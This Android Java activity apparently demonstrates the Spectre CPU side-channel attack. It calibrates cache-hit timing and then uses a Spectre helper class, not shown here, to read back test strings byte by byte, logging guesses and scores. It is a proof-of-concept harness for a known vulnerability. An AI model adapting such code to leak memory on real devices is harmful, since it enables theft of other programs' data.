package android.spectre;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.Arrays;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = MainActivity.class.getSimpleName();

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {
                Log.i(TAG, "Button");
                Thread t = new Thread() {
                    void spectre(String msg) {
                        int[] hitTimes  = new int[11];
                        int[] missTimes = new int[11];
                        Log.i(TAG, "Using spectre to read '" + msg + "'");
                        int cacheThreshold = Spectre.calibrateTiming(1024, hitTimes, missTimes);
                        Log.i(TAG, "Cache hit: " + Arrays.toString(hitTimes));
                        Log.i(TAG, "Cache miss: " + Arrays.toString(missTimes));
                        Log.i(TAG, "Cache threshold: " + cacheThreshold);


                        byte[] raw_data = msg.getBytes();
                        Spectre.read(raw_data, new Spectre.Callback() {
                            @Override
                            public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
                                String msg = String.format("ptr=0x%016x, %s, %02x => '%c', score=%d",
                                        pointer,
                                        bestScore >= 2 * secondScore ? ": Success" : ": Unclear",
                                        bestGuess,
                                        bestGuess > 31 && bestGuess < 127 ? (char) bestGuess : '�',
                                        bestScore);

                                if (secondScore > 0) {
                                    msg += String.format("  --  Second guess: %02x => '%c', score=%d",
                                            secondGuess,
                                            secondGuess > 31 && secondGuess < 127 ? (char) secondGuess : '�',
                                            secondScore);
                                }
                                Log.i(TAG, msg);

                            }
                        });
                    }
                    @Override
                    public void run() {

                        spectre("Warm up");
                        spectre("Mary had a little lamb");
                        spectre("Mary had a little lamb");
                        spectre("It's fleece was as white as snow");
                    }
                };
                t.setPriority(Thread.MAX_PRIORITY);
                t.start();
            }
        });
    }
}
